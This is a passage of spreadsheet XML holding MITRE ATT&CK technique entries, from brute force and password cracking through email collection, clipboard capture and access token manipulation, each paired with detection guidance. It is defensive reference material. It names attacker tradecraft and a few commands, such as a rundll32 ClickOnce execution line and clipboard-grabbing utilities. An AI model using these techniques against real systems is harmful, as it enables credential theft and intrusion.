    <t>Application Log: Application Log Content, Command: Command Execution, User Account: User Account Authentication</t>
  </si>
  <si>
    <t>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using a repetitive or iterative mechanism.(Citation: Dragos Crashoverride 2018) Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.
Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.</t>
  </si>
  <si>
    <t>Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials. Also monitor for many failed authentication attempts across various accounts that may result from password spraying attempts. It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network.</t>
  </si>
  <si>
    <t>T1110.001</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, User Account: User Account Authentication</t>
  </si>
  <si>
    <t>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adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.
Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)
Typically, management services over commonly used ports are used when guessing passwords.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 SNMP (161/UDP and 162/TCP/UDP)
In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)
In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows "logon failure" event ID 4625.</t>
  </si>
  <si>
    <t>Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.</t>
  </si>
  <si>
    <t>T1110.002</t>
  </si>
  <si>
    <t>Password Cracking (T1110.002)</t>
  </si>
  <si>
    <t>Identity Provider, Linux, Network, Office Suite, Windows, macOS</t>
  </si>
  <si>
    <t>Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602) in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A) 
Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.</t>
  </si>
  <si>
    <t>It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network. Consider focusing efforts on detecting other adversary behavior used to acquire credential materials, such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).</t>
  </si>
  <si>
    <t>T1110.003</t>
  </si>
  <si>
    <t>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when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)
Typically, management services over commonly used ports are used when password spraying.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
In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows "logon failure" event ID 4625.</t>
  </si>
  <si>
    <t>Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). Specifically, monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.
Consider the following event IDs:(Citation: Trimarc Detecting Password Spraying)
* Domain Controllers: "Audit Logon" (Success &amp; Failure) for event ID 4625.
* Domain Controllers: "Audit Kerberos Authentication Service" (Success &amp; Failure) for event ID 4771.
* All systems: "Audit Logon" (Success &amp; Failure) for event ID 4648.</t>
  </si>
  <si>
    <t>T1110.004</t>
  </si>
  <si>
    <t>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the same passwords across personal and business accounts.
Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.
Typically, management services over commonly used ports are used when stuffing credentials.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t>
  </si>
  <si>
    <t>T1111</t>
  </si>
  <si>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t>
  </si>
  <si>
    <t>Detecting use of proxied smart card connections by an adversary may be difficult because it requires the token to be inserted into a system; thus it is more likely to be in use by a legitimate user and blend in with other network behavior.
Similar to [Input Capture](https://attack.mitre.org/techniques/T1056), keylogging activity can take various forms but can may be detected via installation of a driver, setting a hook, or usage of particular API calls associated with polling to intercept keystrokes.</t>
  </si>
  <si>
    <t>T1112</t>
  </si>
  <si>
    <t>Command: Command Execution, Network Traffic: Network Traffic Flow, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Deletion, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.
Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.
Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)
The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.</t>
  </si>
  <si>
    <t>Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.
Monitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.
Monitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016).</t>
  </si>
  <si>
    <t>T1113</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as &lt;code&gt;CopyFromScreen&lt;/code&gt;, &lt;code&gt;xwd&lt;/code&gt;, or &lt;code&gt;screencapture&lt;/code&gt;.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)
</t>
  </si>
  <si>
    <t>Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.</t>
  </si>
  <si>
    <t>T1114</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Command: Command Execution, File: File Access, Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses.(Citation: TrustedSec OOB Communications)(Citation: CISA AA20-352A 2021) Adversaries can collect or forward email from mail servers or clients. </t>
  </si>
  <si>
    <t>There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.
File access of local system email files for Exfiltration, unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.
Monitor processes and command-line arguments for actions that could be taken to gather local email files.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Detection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account.
Auto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include &lt;code&gt;X-MS-Exchange-Organization-AutoForwarded&lt;/code&gt; set to true, &lt;code&gt;X-MailFwdBy&lt;/code&gt; and &lt;code&gt;X-Forwarded-To&lt;/code&gt;. The &lt;code&gt;forwardingSMTPAddress&lt;/code&gt; parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) High volumes of emails that bear the &lt;code&gt;X-MS-Exchange-Organization-AutoForwarded&lt;/code&gt; header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.</t>
  </si>
  <si>
    <t>T1114.001</t>
  </si>
  <si>
    <t>Local Email Collection (T1114.001)</t>
  </si>
  <si>
    <t>Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.
Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\Users\&lt;username&gt;\Documents\Outlook Files` or `C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Outlook`.(Citation: Microsoft Outlook Files)</t>
  </si>
  <si>
    <t>Monitor processes and command-line arguments for actions that could be taken to gather local email files. Monitor for unusual processes accessing local email files.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</si>
  <si>
    <t>T1114.002</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Command: Command Execution, Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation</t>
  </si>
  <si>
    <t>Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.</t>
  </si>
  <si>
    <t>Monitor for unusual login activity from unknown or abnormal locations, especially for privileged accounts (ex: Exchange administrator account).</t>
  </si>
  <si>
    <t>T1114.003</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Cloud Service: Cloud Service Metadata, Command: Command Execution</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation: Mac Forwarding Rules)
Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.(Citation: Pfammatter - Hidden Inbox Rules)
In some environments, administrators may be able to enable email forwarding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conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives. </t>
  </si>
  <si>
    <t>Detection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account. This is especially true in cases with hidden auto-forwarding rules. This makes it only possible to reliably detect the existence of a hidden auto-forwarding rule by examining message tracking logs or by using a MAPI editor to notice the modified rule property values.(Citation: Pfammatter - Hidden Inbox Rules)
Auto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include `X-MS-Exchange-Organization-AutoForwarded` set to true, `X-MailFwdBy` and `X-Forwarded-To`. The `forwardingSMTPAddress` parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) High volumes of emails that bear the `X-MS-Exchange-Organization-AutoForwarded` header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.</t>
  </si>
  <si>
    <t>T1115</t>
  </si>
  <si>
    <t>Adversaries may collect data stored in the clipboard from users copying information within or between applications. 
For example, on Windows adversaries can access clipboard data by using &lt;code&gt;clip.exe&lt;/code&gt; or &lt;code&gt;Get-Clipboard&lt;/code&gt;.(Citation: MSDN Clipboard)(Citation: clip_win_server)(Citation: CISA_AA21_200B) Additionally, adversaries may monitor then replace users’ clipboard with their data (e.g., [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002)).(Citation: mining_ruby_reversinglabs)
macOS and Linux also have commands, such as &lt;code&gt;pbpaste&lt;/code&gt;, to grab clipboard contents.(Citation: Operating with EmPyre)</t>
  </si>
  <si>
    <t>Access to the clipboard is a legitimate function of many applications on an operating system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity.</t>
  </si>
  <si>
    <t>T1119</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Access, Script: Script Execution, User Account: User Account Authentication</t>
  </si>
  <si>
    <t>IaaS, Linux, Office Suite, SaaS, Windows, macOS</t>
  </si>
  <si>
    <t>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In cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.(Citation: Mandiant UNC3944 SMS Phishing 2023) 
This functionality could also be built into remote access tools. 
This technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.</t>
  </si>
  <si>
    <t>Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as [Data Staged](https://attack.mitre.org/techniques/T1074). As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), as well as through cloud APIs and command line interfaces.</t>
  </si>
  <si>
    <t>T1120</t>
  </si>
  <si>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</si>
  <si>
    <t>T1123</t>
  </si>
  <si>
    <t>An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.(Citation: ESET Attor Oct 2019)
Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.</t>
  </si>
  <si>
    <t>Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.
Behavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the microphone, recording devices, or recording software, and a process periodically writing files to disk that contain audio data.</t>
  </si>
  <si>
    <t>T1124</t>
  </si>
  <si>
    <t>An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or &lt;code&gt;systemsetup&lt;/code&gt; on macOS.(Citation: MSDN System Time)(Citation: Technet Windows Time Service)(Citation: systemsetup mac time) These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.(Citation: Mac Time Sync)(Citation: linux system time)
System time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing &lt;code&gt;net time \\hostname&lt;/code&gt; to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using &lt;code&gt;w32tm /tz&lt;/code&gt;.(Citation: Technet Windows Time Service) In addition, adversaries can discover device uptime through functions such as &lt;code&gt;GetTickCount()&lt;/code&gt; to determine how long it has been since the system booted up.(Citation: Virtualization/Sandbox Evasion)
On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show clock detail` can be used to see the current time configuration.(Citation: show_clock_detail_cisco_cmd)
In addition, system calls – such as &lt;code&gt;time()&lt;/code&gt; – have been used to collect the current time on Linux devices.(Citation: MAGNET GOBLIN) On macOS systems, adversaries may use commands such as &lt;code&gt;systemsetup -gettimezone&lt;/code&gt; or &lt;code&gt;timeIntervalSinceNow&lt;/code&gt; to gather current time zone information or current date and time.(Citation: System Information Discovery Technique)(Citation: ESET DazzleSpy Jan 2022)
This information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)(Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)</t>
  </si>
  <si>
    <t>Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.
For network infrastructure devices, collect AAA logging to monitor `show` commands being run by non-standard users from non-standard locations.</t>
  </si>
  <si>
    <t>T1125</t>
  </si>
  <si>
    <t>An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.
Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.
In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)</t>
  </si>
  <si>
    <t>Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.
Behavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the video camera, recording devices, or recording software, and a process periodically writing files to disk that contain video or camera image data.</t>
  </si>
  <si>
    <t>T1127</t>
  </si>
  <si>
    <t>Command: Command Execution, Module: Module Load, Process: Process Creation, Process: Process Metadata</t>
  </si>
  <si>
    <t>Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.</t>
  </si>
  <si>
    <t>Monitor for abnormal presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.
Use process monitoring to monitor the execution and arguments of from developer utilities that may be abused. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.</t>
  </si>
  <si>
    <t>T1127.001</t>
  </si>
  <si>
    <t>Use process monitoring to monitor the execution and arguments of MSBuild.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.</t>
  </si>
  <si>
    <t>T1127.002</t>
  </si>
  <si>
    <t>ClickOnce (T1127.002)</t>
  </si>
  <si>
    <t>Adversaries may use ClickOnce applications (.appref-ms and .application files) to proxy execution of code through a trusted Windows utility.(Citation: Burke/CISA ClickOnce BlackHat) ClickOnce is a deployment that enables a user to create self-updating Windows-based .NET applications (i.e, .XBAP, .EXE, or .DLL) that install and run from a file share or web page with minimal user interaction. The application launches as a child process of DFSVC.EXE, which is responsible for installing, launching, and updating the application.(Citation: SpectorOps Medium ClickOnce)
Because ClickOnce applications receive only limited permissions, they do not require administrative permissions to install.(Citation: Microsoft Learn ClickOnce) As such, adversaries may abuse ClickOnce to proxy execution of malicious code without needing to escalate privileges.
ClickOnce may be abused in a number of ways. For example, an adversary may rely on [User Execution](https://attack.mitre.org/techniques/T1204). When a user visits a malicious website, the .NET malware is disguised as legitimate software and a ClickOnce popup is displayed for installation.(Citation: NetSPI ClickOnce)
Adversaries may also abuse ClickOnce to execute malware via a [Rundll32](https://attack.mitre.org/techniques/T1218/011) script using the command `rundll32.exe dfshim.dll,ShOpenVerbApplication1`.(Citation: LOLBAS /Dfsvc.exe)
Additionally, an adversary can move the ClickOnce application file to a remote user’s startup folder for continued malicious code deployment (i.e., [Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001)).(Citation: Burke/CISA ClickOnce BlackHat)(Citation: Burke/CISA ClickOnce Paper)</t>
  </si>
  <si>
    <t>T1129</t>
  </si>
  <si>
    <t>Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).
Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.
The Linux &amp; macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen` and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib` files.(Citation: Apple Dev Dynamic Libraries)(Citation: Linux Shared Libraries)(Citation: RotaJakiro 2021 netlab360 analysis)(Citation: Unit42 OceanLotus 2017)
The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in `NTDLL.dll` and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like `LoadLibrary` at run time.(Citation: Microsoft DLL)</t>
  </si>
  <si>
    <t>Monitoring DLL module loads may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows modules load functions are common and may be difficult to distinguish from malicious behavior. Legitimate software will likely only need to load routine, bundled DLL modules or Windows system DLLs such that deviation from known module loads may be suspicious. Limiting DLL module loads to `%SystemRoot%` and `%ProgramFiles%` directories will protect against module loads from unsafe paths. 
Correlation of other events with behavior surrounding module loads using API monitoring and suspicious DLLs written to disk will provide additional context to an event that may assist in determining if it is due to malicious behavior.</t>
  </si>
  <si>
    <t>T1132</t>
  </si>
  <si>
    <t>Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.</t>
  </si>
  <si>
    <t>T1132.001</t>
  </si>
  <si>
    <t>Standard Encoding (T1132.001)</t>
  </si>
  <si>
    <t>Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding)(Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.</t>
  </si>
  <si>
    <t>T1132.002</t>
  </si>
  <si>
    <t>Non-Standard Encoding (T1132.002)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) </t>
  </si>
  <si>
    <t>T1133</t>
  </si>
  <si>
    <t>Initial Access, Persistence</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Logon Session: Logon Session Metadata, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
    <t>Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)
Access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.
Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)</t>
  </si>
  <si>
    <t>Follow best practices for detecting adversary use of [Valid Accounts](https://attack.mitre.org/techniques/T1078) for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.
When authentication is not required to access an exposed remote service, monitor for follow-on activities such as anomalous external use of the exposed API or application.</t>
  </si>
  <si>
    <t>T1134</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Modification, Command: Command Execution, Process: OS API Execution, Process: Process Creation, Process: Process Metadata, User Account: User Account Metadata</t>
  </si>
  <si>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Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)).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</si>
  <si>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If an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. 
There are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., &lt;code&gt;LogonUser&lt;/code&gt; (Citation: Microsoft LogonUser), &lt;code&gt;DuplicateTokenEx&lt;/code&gt;(Citation: Microsoft DuplicateTokenEx), and &lt;code&gt;ImpersonateLoggedOnUser&lt;/code&gt;(Citation: Microsoft ImpersonateLoggedOnUser)). Please see the referenced Windows API pages for more information.
Query systems for process and thread token information and look for inconsistencies such as user owns processes impersonating the local SYSTEM account.(Citation: BlackHat Atkinson Winchester Token Manipulation)
Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.</t>
  </si>
  <si>
    <t>T1134.001</t>
  </si>
  <si>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</si>
  <si>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</si>
  <si>
    <t>T1134.002</t>
  </si>
  <si>
    <t>Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as &lt;code&gt;CreateProcessWithTokenW&lt;/code&gt; and &lt;code&gt;runas&lt;/code&gt;.(Citation: Microsoft RunAs)
Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) before being used to create a process.
